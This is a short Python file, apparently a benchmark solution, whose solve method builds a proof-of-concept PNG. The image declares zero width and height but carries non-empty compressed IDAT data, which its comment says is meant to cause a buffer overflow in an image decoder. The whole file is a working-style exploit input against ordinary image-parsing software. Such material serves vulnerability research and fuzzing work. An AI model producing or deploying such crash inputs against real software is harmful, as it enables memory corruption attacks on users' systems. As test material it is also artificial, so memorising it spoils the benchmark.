import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        signature = b'\x89PNG\r\n\x1a\n'
        # IHDR: width=0, height=0, 8-bit, RGB, default settings
        ihdr_data = (
            struct.pack('>I', 0) +  # width
            struct.pack('>I', 0) +  # height
            b'\x08\x02\x00\x00\x00'  # bit depth, color type, compression, filter, interlace
        )
        ihdr_crc = struct.pack('>I', zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff)
        ihdr_chunk = struct.pack('>I', 13) + b'IHDR' + ihdr_data + ihdr_crc
        # IDAT with non-empty compressed data to cause overflow on zero-size buffer
        fake_data = b'\x00' * 16  # Small non-zero decompressed size
        compressed = zlib.compress(fake_data)
        idat_length = struct.pack('>I', len(compressed))
        idat_crc = struct.pack('>I', zlib.crc32(b'IDAT' + compressed) & 0xffffffff)
        idat_chunk = idat_length + b'IDAT' + compressed + idat_crc
        # IEND
        iend_crc = struct.pack('>I', zlib.crc32(b'IEND') & 0xffffffff)
        iend_chunk = struct.pack('>I', 0) + b'IEND' + iend_crc
        poc = signature + ihdr_chunk + idat_chunk + iend_chunk
        return poc
